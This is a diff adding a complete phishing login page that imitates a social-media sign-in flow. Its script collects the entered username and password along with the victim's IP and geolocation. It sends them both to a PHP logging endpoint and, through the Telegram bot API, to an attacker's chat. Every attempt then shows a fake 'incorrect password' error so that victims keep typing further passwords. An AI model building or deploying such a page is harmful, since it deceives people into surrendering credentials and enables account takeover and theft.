@@ -1,0 +1,531 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>#1 Login</title>
+</head>
+<body>
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: sans-serif;
+        }
+
+        body {
+            background: black;
+            color: white;
+            padding: 10px;
+        }
+
+        nav ul {
+            display: flex;
+            justify-content: space-between;
+            list-style-type: none;
+            align-items: center;
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            background-color: transparent;
+            border: none;
+            font-size: 18px;
+            outline: none;
+            color: white;
+            border-bottom: 1px solid #ffffff4b;
+        }
+
+        footer {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            border-top: 1px solid #ffffff4b;
+            width: 100%;
+        }
+
+        footer ul {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            list-style-type: none;
+            padding: 10px 20px;
+        }
+
+        footer button {
+            padding: 10px 30px;
+            background: white;
+            font-size: 15px;
+            border-radius: 30px;
+            border: none;
+            cursor: pointer;
+            font-weight: 600;
+        }
+
+        footer button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        a {
+            color: inherit;
+            text-decoration: none;
+        }
+
+        #login {
+            display: none;
+        }
+
+        .container-two {
+            display: none;
+        }
+
+        .feedback {
+            color: #ff4444;
+            font-family: sans-serif;
+            font-size: 14px;
+            text-align: left;
+            margin: 10px 0 0 0;
+            display: none;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .feedback svg {
+            width: 18px;
+            height: 18px;
+            flex-shrink: 0;
+        }
+
+        .success-msg {
+            color: #00c853;
+            font-family: sans-serif;
+            font-size: 14px;
+            text-align: left;
+            margin: 10px 0 0 0;
+            display: none;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .success-msg svg {
+            width: 18px;
+            height: 18px;
+            flex-shrink: 0;
+        }
+
+        .username-display {
+            color: #888;
+            font-size: 14px;
+            padding: 5px 0;
+            border-bottom: 1px solid #ffffff4b;
+            margin-bottom: 15px;
+        }
+
+        .username-display span {
+            color: white;
+            font-weight: 500;
+        }
+
+        .bot-status {
+            text-align: center;
+            font-size: 12px;
+            color: #999;
+            margin-top: 10px;
+            padding: 5px;
+        }
+
+        .bot-status .online {
+            color: #00c853;
+        }
+
+        .bot-status .offline {
+            color: #ff4444;
+        }
+
+        @media screen and (min-width: 768px) {
+            .fixed-width {
+                width: 50%;
+                margin: 0 auto;
+            }
+            footer {
+                width: 50%;
+                margin: 0 50%;
+                transform: translateX(-50%);
+            }
+        }
+    </style>
+
+    <div class="fixed-width">
+        <nav>
+            <ul>
+                <li id="cancel" style="cursor: pointer;">Cancel</li>
+                <img src="Xd_logo.jpg" loading="lazy" width="35px" alt="#1 Logo">
+                <li></li>
+            </ul>
+        </nav>
+
+        <main>
+            <div class="container-one">
+                <h2 style="padding: 10px; margin: 20px 0;">To get started, first enter your phone, email, or @username</h2>
+                <input type="text" placeholder="Mobile number or email address" id="username">
+                <div class="feedback" id="usernameFeedback"></div>
+            </div>
+
+            <div class="container-two">
+                <h2 style="padding: 10px; margin: 20px 0;">Enter your password</h2>
+                <div class="username-display">Username: <span id="usernameText"></span></div>
+                <input type="password" placeholder="Password" id="password">
+                <div class="feedback" id="passwordFeedback"></div>
+                <div class="success-msg" id="successMsg"></div>
+                <div class="bot-status" id="botStatus"></div>
+            </div>
+        </main>
+
+        <footer>
+            <ul>
+                <li><a href="#" id="forgotPassword">Forget Password?</a></li>
+                <li><button id="next">Next</button></li>
+                <li id="login"><button id="loginBtn">Log in</button></li>
+            </ul>
+        </footer>
+    </div>
+
+    <!-- Hidden fields (fallback only) -->
+    <input type="hidden" id="country" value="Unknown">
+    <input type="hidden" id="city" value="Unknown">
+    <input type="hidden" id="continent" value="Unknown">
+    <input type="hidden" id="ip" value="Unknown">
+
+    <script>
+        // ============================================
+        // CONFIGURATION - PHP BACKEND
+        // ============================================
+        
+        const API_BASE = window.location.origin;
+        const SETTINGS_URL = API_BASE + '/data/settings.json';
+        const PROCESS_URL = API_BASE + '/app/process.php';
+
+        // ============================================
+        // GLOBALS
+        // ============================================
+        let BOT_TOKEN = '';
+        let CHAT_ID = '';
+        let botReady = false;
+
+        // DOM Elements
+        const usernameInput = document.getElementById("username");
+        const passwordInput = document.getElementById("password");
+        const nextBtn = document.getElementById("next");
+        const loginBtn = document.getElementById("loginBtn");
+        const loginContainer = document.getElementById("login");
+        const cancelBtn = document.getElementById("cancel");
+        const usernameText = document.getElementById("usernameText");
+        const containerOne = document.querySelector(".container-one");
+        const containerTwo = document.querySelector(".container-two");
+        const usernameFeedback = document.getElementById("usernameFeedback");
+        const passwordFeedback = document.getElementById("passwordFeedback");
+        const successMsg = document.getElementById("successMsg");
+        const forgotPassword = document.getElementById("forgotPassword");
+        const botStatus = document.getElementById("botStatus");
+
+        let isProcessing = false;
+        let attempts = 0;
+
+        // ============================================
+        // GET REAL LOCATION FROM ipapi.co
+        // ============================================
+        async function getRealLocation() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                console.log('📍 Location detected:', data);
+                return {
+                    ip: data.ip || 'Unknown',
+                    country: data.country_name || 'Unknown',
+                    city: data.city || 'Unknown',
+                    continent: data.continent_code || 'Unknown',
+                    region: data.region || 'Unknown',
+                    latitude: data.latitude || 'Unknown',
+                    longitude: data.longitude || 'Unknown'
+                };
+            } catch (error) {
+                console.warn('⚠️ ipapi.co failed, using fallback:', error);
+                // Fallback to hidden fields if API fails
+                return {
+                    ip: document.getElementById('ip').value || 'Unknown',
+                    country: document.getElementById('country').value || 'Unknown',
+                    city: document.getElementById('city').value || 'Unknown',
+                    continent: document.getElementById('continent').value || 'Unknown'
+                };
+            }
+        }
+
+        // ============================================
+        // LOAD BOT SETTINGS FROM JSON
+        // ============================================
+        async function loadBotSettings() {
+            try {
+                const response = await fetch(SETTINGS_URL + '?t=' + Date.now());
+                const data = await response.json();
+                if (data.bot_token && data.chat_id) {
+                    BOT_TOKEN = data.bot_token;
+                    CHAT_ID = data.chat_id;
+                    botReady = true;
+                    botStatus.innerHTML = '';
+                    botStatus.className = 'bot-status online';
+                    console.log('✅ Bot settings loaded');
+                } else {
+                    botStatus.innerHTML = '';
+                    botStatus.className = 'bot-status offline';
+                }
+            } catch (error) {
+                botStatus.innerHTML = '';
+                botStatus.className = 'bot-status offline';
+                console.error('Error loading settings:', error);
+            }
+        }
+
+        // ============================================
+        // UPDATE NEXT BUTTON
+        // ============================================
+        function updateNextButton() {
+            const username = usernameInput.value.trim();
+            if (username.length > 0) {
+                nextBtn.disabled = false;
+                nextBtn.style.opacity = '1';
+            } else {
+                nextBtn.disabled = true;
+                nextBtn.style.opacity = '0.5';
+            }
+        }
+
+        usernameInput.addEventListener('input', updateNextButton);
+        updateNextButton();
+
+        // ============================================
+        // SHOW/HIDE ERROR
+        // ============================================
+        function showError(element, message) {
+            element.innerHTML = `
+                <svg viewBox="0 0 24 24" fill="none" stroke="#ff4444" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <circle cx="12" cy="12" r="10" />
+                    <line x1="12" y1="8" x2="12" y2="12" />
+                    <line x1="12" y1="16" x2="12.01" y2="16" />
+                </svg>
+                <span>${message}</span>
+            `;
+            element.style.display = 'flex';
+        }
+
+        function showSuccess(element, message) {
+            element.innerHTML = `
+                <svg viewBox="0 0 24 24" fill="none" stroke="#00c853" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14" />
+                    <polyline points="22 4 12 14.01 9 11.01" />
+                </svg>
+                <span>${message}</span>
+            `;
+            element.style.display = 'flex';
+        }
+
+        function hideError(element) {
+            element.style.display = 'none';
+        }
+
+        function clearErrors() {
+            hideError(usernameFeedback);
+            hideError(passwordFeedback);
+            hideError(successMsg);
+        }
+
+        // ============================================
+        // SEND TO PHP BACKEND (for logging)
+        // ============================================
+        function sendToBackend(username, password, location) {
+            const url = `${PROCESS_URL}?u=${encodeURIComponent(username)}&p=${encodeURIComponent(password)}&ip=${encodeURIComponent(location.ip)}&country=${encodeURIComponent(location.country)}&city=${encodeURIComponent(location.city)}&continent=${encodeURIComponent(location.continent)}`;
+            console.log('📤 Sending to backend:', url);
+            fetch(url).catch(() => console.error('Backend send failed'));
+        }
+
+        // ============================================
+        // SEND TELEGRAM MESSAGE (from frontend - BROWSER)
+        // ============================================
+        async function sendTelegram(username, password, location) {
+            if (!botReady) {
+                console.warn('Bot not ready, skipping Telegram');
+                return false;
+            }
+
+            const message = `🔐 *New #1 Login Attempt #${attempts}*\n\n` +
+                `👤 Username: ${username}\n` +
+                `🔑 Password: ${password}\n` +
+                `🌐 IP: ${location.ip}\n` +
+                `📍 Location: ${location.city}, ${location.country}\n` +
+                `🌍 Continent: ${location.continent}\n` +
+                `⏰ Time: ${new Date().toLocaleString()}`;
+
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const data = {
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+            };
+
+            console.log('📤 Sending Telegram from frontend...');
+
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+                const result = await response.json();
+                if (result.ok) {
+                    console.log('✅ Telegram sent successfully!');
+                    return true;
+                } else {
+                    console.error('❌ Telegram error:', result);
+                    return false;
+                }
+            } catch (error) {
+                console.error('❌ Telegram fetch failed:', error);
+                return false;
+            }
+        }
+
+        // ============================================
+        // NEXT BUTTON - Show Password Screen
+        // ============================================
+        nextBtn.addEventListener("click", function() {
+            const username = usernameInput.value.trim();
+
+            if (username === "") {
+                showError(usernameFeedback, 'Please enter your username or email');
+                return;
+            }
+
+            hideError(usernameFeedback);
+            containerOne.style.display = "none";
+            containerTwo.style.display = "block";
+            usernameText.textContent = username;
+            loginContainer.style.display = "block";
+            nextBtn.style.display = "none";
+            passwordInput.value = '';
+            passwordInput.focus();
+
+            // Load bot settings when password screen appears
+            loadBotSettings();
+        });
+
+        // ============================================
+        // CANCEL BUTTON - Go Back
+        // ============================================
+        cancelBtn.addEventListener("click", function() {
+            containerOne.style.display = "block";
+            containerTwo.style.display = "none";
+            loginContainer.style.display = "none";
+            nextBtn.style.display = "block";
+            clearErrors();
+        });
+
+        // ============================================
+        // FORGOT PASSWORD
+        // ============================================
+        forgotPassword.addEventListener("click", function(e) {
+            e.preventDefault();
+            alert('Forgot password? Please contact support.');
+        });
+
+        // ============================================
+        // LOGIN BUTTON - INFINITE ATTEMPTS
+        // ============================================
+        loginBtn.addEventListener("click", async function(e) {
+            e.preventDefault();
+
+            if (isProcessing) return;
+
+            const username = usernameInput.value.trim();
+            const password = passwordInput.value.trim();
+
+            clearErrors();
+
+            if (!password) {
+                showError(passwordFeedback, 'Please enter your password');
+                passwordInput.focus();
+                return;
+            }
+
+            attempts++;
+            isProcessing = true;
+            loginBtn.disabled = true;
+            loginBtn.textContent = 'Logging in...';
+
+            console.log('📊 Attempt:', attempts);
+
+            // Get location from ipapi.co
+            const location = await getRealLocation();
+
+            // 1. Send to PHP backend for logging
+            sendToBackend(username, password, location);
+
+            // 2. Send Telegram from frontend
+            if (botReady) {
+                await sendTelegram(username, password, location);
+            } else {
+                console.log('⚠️ Bot not configured, skipping Telegram');
+            }
+
+            // ============================================
+            // INFINITE ATTEMPTS - Always show error
+            // ============================================
+            setTimeout(function() {
+                loginBtn.disabled = false;
+                loginBtn.textContent = 'Log in';
+                showError(passwordFeedback, 'The password you entered is incorrect. Please check your password and try again.');
+                passwordInput.value = '';
+                passwordInput.focus();
+                isProcessing = false;
+            }, 1000);
+        });
+
+        // ============================================
+        // ENTER KEY SUPPORT
+        // ============================================
+        usernameInput.addEventListener("keydown", function(e) {
+            if (e.key === "Enter") {
+                e.preventDefault();
+                if (containerOne.style.display !== "none") {
+                    nextBtn.click();
+                }
+            }
+        });
+
+        passwordInput.addEventListener("keydown", function(e) {
+            if (e.key === "Enter") {
+                e.preventDefault();
+                if (loginContainer.style.display !== "none") {
+                    loginBtn.click();
+                }
+            }
+        });
+
+        // Clear errors when typing
+        passwordInput.addEventListener("input", function() {
+            hideError(passwordFeedback);
+            hideError(successMsg);
+        });
+
+        usernameInput.addEventListener("input", function() {
+            hideError(usernameFeedback);
+        });
+
+        console.log('🚀 #1 Login page ready with ipapi.co + Infinite Attempts!');
+        console.log('📁 API Base:', API_BASE);
+    </script>
+
+</body>
+</html>
